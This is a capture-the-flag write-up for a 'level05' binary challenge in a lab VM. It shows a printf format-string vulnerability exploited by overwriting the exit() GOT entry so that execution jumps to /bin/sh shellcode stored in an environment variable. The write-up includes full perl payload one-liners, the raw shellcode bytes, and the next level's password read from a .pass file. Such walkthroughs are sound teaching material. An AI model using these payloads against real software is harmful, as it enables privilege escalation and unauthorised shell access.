1. ssh level05@192.168.56.101 -p 4242
2. ls -la
3. ./level05
    >> asdfa
    << asdfa
    
    ./level05
    >> qwe123
    << qwe123

4. scp -P 4242 level05@192.168.56.101:/home/users/level05/level05 .
5. open /Application/IDA Freeware 7.7/ida64.app
6. analyze level05 ELF binary ->
    mov     dword ptr [esp+4], 64h ; 100 byte buffer (for fgets)
    ...
    call    _fgets
    ...
    ; [A-Z] checks, to [a-z] transformation
    ...
    call    _printf
    mov     dword ptr [esp], 0
    call    _exit
 
First of all, we have _printf to abuse

7. Test asm research
    ./level05
    >> DaN@cSu.Edu
    << dan@csu.edu

    OK, Really transforming letters
    
    ./level05
    >> %1$p
    << 0x64
    >> %2$p
    << 0xf7fcfac0

    printf is not protected, good

8. Let's print what we put with %n$p pattern
    >> perl -e 'print "A" x 4; print map { "$_|%$_\$p." } (1..100)' | cat - | ./level05
    << aaaa1|0x64.2|0xf7fcfac0.3|0xf7ec3af9.4|0xffffd67f.5|0xffffd67e.6|(nil).7|0xffffffff.8|0xffffd704.9|0xf7fdb000.10|0x61616161.11|0x31257c31.12|0x322e7024.13|%1

Catch it! >> 10|0x61616161 -> %10$p -> we can exploit it with ENV variable stored at 10th position

9. It's time to `exit()`
All we have:
 - Exploitable printf
 - Environment variable could contain shellcode
 - exit() GOT address

Plan: spoof exit() GOT address with shellcode (env var) address using printf modifier

????

10. exit() GOT address
    >> gdb ./level05
    >> (gdb) info address exit
    << 0x8048370
    >> x/i 0x8048370
    
0x80497e0
 
11. Environment address
    >> env -i EXPLOIT=$(perl -e 'print "\x90" x 1000 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"') gdb level05
    >> (gdb) r
    Ctrl+C
    >> (gdb) x/1000s environ
    ...
    
0xffffdc70

13. Oops... 0xffffdc70 too long, let's divide it
    56432 - 0x^^^^^^^^[8] = 56424
    65535 - 56432 = 9103
    
perl -e 'print "\xe0\x97\x04\x08" . "\xe2\x97\x04\x08" . "%56424d" . "%10$hn" . "%9103d" . "%11$hn"'

14. Inject
    >> (perl -e 'print "\xe0\x97\x04\x08" . "\xe2\x97\x04\x08" . "%56424d" . "%10\$hn" . "%9103d" . "%11\$hn"'; cat) | env -i EXPLOIT=$(perl -e 'print "\x90" x 1000 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"') ./level05
    >> whoami
    << level06
    >> cat /home/users/level06/.pass
    
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
